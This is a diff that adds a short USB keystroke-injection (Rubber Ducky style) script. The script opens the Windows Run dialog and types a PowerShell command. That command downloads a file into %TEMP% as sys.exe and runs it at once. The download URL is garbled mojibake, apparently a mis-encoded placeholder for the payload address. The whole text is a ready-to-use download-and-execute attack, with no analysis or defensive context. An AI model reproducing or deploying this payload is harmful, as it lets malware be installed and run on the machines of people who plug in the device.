@@ -1,0 +1,5 @@
+GUI r
+DELAY 2
+STRING powershell (new-object System.Net.WebClient).DownloadFile('Ä¾ÂíµØÖ· ','%TEMP%\sys.exe'); Start-Process "%TEMP%\sys.exe"
+DELAY 1000
+ENTER
